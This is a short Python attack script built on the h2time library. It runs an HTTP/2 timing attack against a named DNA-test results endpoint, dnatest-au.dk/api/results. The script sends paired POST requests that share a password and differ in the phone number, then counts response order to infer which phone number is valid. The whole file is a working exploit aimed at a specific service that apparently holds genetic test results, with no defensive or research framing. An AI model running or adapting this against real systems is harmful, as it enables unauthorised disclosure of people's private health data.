from h2time import H2Time, H2Request
import asyncio
import random
import string

async def attack():
    # oprindeligt k=2000 og num_request_pairs=4
    post_data = 'password=12345789abc&phone=00000000'
    post_data2 = 'password=12345789abc&phone=61791169'
    r1 = H2Request('POST', 'https://dnatest-au.dk/api/results', {'content-length': str(len(post_data)),
                                                     'Content-Type': 'application/x-www-form-urlencoded'}, post_data)
    r2 = H2Request('POST', 'https://dnatest-au.dk/api/results', {'content-length': str(len(post_data2)),
                                                     'Content-Type': 'application/x-www-form-urlencoded'}, post_data2)

    # Print request 1 post_data
    print("Request 1 post data: %s" % post_data)
    print("Request 2 post data: %s" % post_data2)

    print()

    num_request_pairs = 10
    margin = 3
    async with H2Time(r1, r2, num_request_pairs=num_request_pairs, num_padding_params=40, sequential=True, inter_request_time_ms=10) as h2t:
        results = await h2t.run_attack()
        output = '\n'.join(map(lambda x: ','.join(map(str, x)), results))
        num = output.count('-')
        print(output)
        print()
    if (num > (num_request_pairs/2)+margin):
        print("Request 1 is likely winner (response received last from server in %s of the request pairs)" % (num))
        print(post_data)
    elif (num < (num_request_pairs/2)-margin):
        print("Request 2 is likely winner (response received last from server in %s of the request pairs)" % (num_request_pairs-num))
    else:
        print("Could not determine winner. Even distributed with %s responses that came in with response 1 last" % (num))

loop = asyncio.get_event_loop()
loop.run_until_complete(attack())
loop.close()

print()
